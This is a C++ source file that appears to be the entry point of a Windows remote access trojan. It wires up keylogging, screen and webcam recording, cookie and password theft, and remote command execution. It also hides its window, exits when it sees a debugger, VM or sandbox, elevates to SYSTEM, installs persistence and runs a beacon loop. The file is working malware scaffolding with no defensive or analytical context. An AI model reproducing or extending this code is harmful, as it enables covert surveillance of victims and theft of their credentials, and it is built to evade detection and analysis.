#include <windows.h>
#include <string>
#include "config.h"
#include "crypto.h"
#include "beacon.h"
#include "modules/keylogger.h"
#include "modules/system_ctrl.h"
#include "modules/live_screen.h"
#include "modules/screen_recorder.h"
#include "modules/webcam_recorder.h"
#include "modules/cookie_stealer.h"
#include "modules/password_stealer.h"
#include "modules/wifi_info.h"
#include "utils.h"

typedef struct {
    const char* type;
    void (*onCommand)(const Beacon::Command&);
    void (*init)();
} ModuleEntry;

static void RegisterModuleCommands() {
    Beacon::RegisterHandler("keylogger_start", Keylogger::OnCommand);
    Beacon::RegisterHandler("keylogger_stop", Keylogger::OnCommand);
    Beacon::RegisterHandler("keylogger_get", Keylogger::OnCommand);
    Beacon::RegisterHandler("keylogger_clear", Keylogger::OnCommand);

    Beacon::RegisterHandler("screen_rec_start", ScreenRecorder::OnCommand);
    Beacon::RegisterHandler("screen_rec_stop", ScreenRecorder::OnCommand);

    Beacon::RegisterHandler("webcam_rec_start", WebcamRecorder::OnCommand);
    Beacon::RegisterHandler("webcam_rec_stop", WebcamRecorder::OnCommand);

    Beacon::RegisterHandler("cookie_steal", CookieStealer::OnCommand);

    Beacon::RegisterHandler("pass_steal", PasswordStealer::OnCommand);

    Beacon::RegisterHandler("live_screen_start", LiveScreen::OnCommand);
    Beacon::RegisterHandler("live_screen_stop", LiveScreen::OnCommand);

    Beacon::RegisterHandler("wifi_scan", WifiInfo::OnCommand);

    Beacon::RegisterHandler("shutdown", SystemCtrl::OnCommand);
    Beacon::RegisterHandler("reboot", SystemCtrl::OnCommand);
    Beacon::RegisterHandler("logoff", SystemCtrl::OnCommand);
    Beacon::RegisterHandler("lock", SystemCtrl::OnCommand);
    Beacon::RegisterHandler("exec", SystemCtrl::OnCommand);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Anti-analysis early checks
    if (Utils::IsDebuggerAttached() || Utils::IsVM() || Utils::IsSandbox()) {
        ExitProcess(0);
    }

    // Singleton mutex
    if (!Utils::CreateSingleton(MUTEX_NAME)) {
        ExitProcess(0);
    }

    // Elevate to SYSTEM if possible
    Utils::ElevateToSystem();

    // Initialize crypto
    if (!Crypto::Init()) {
        ExitProcess(1);
    }

    // Install persistence
    Utils::InstallPersistence();

    // Register all command handlers
    RegisterModuleCommands();

    // Start passive modules
#if MODULE_KEYLOGGER
    Keylogger::Start();
#endif

    // Main beacon loop
    Beacon::Loop();

    return 0;
}
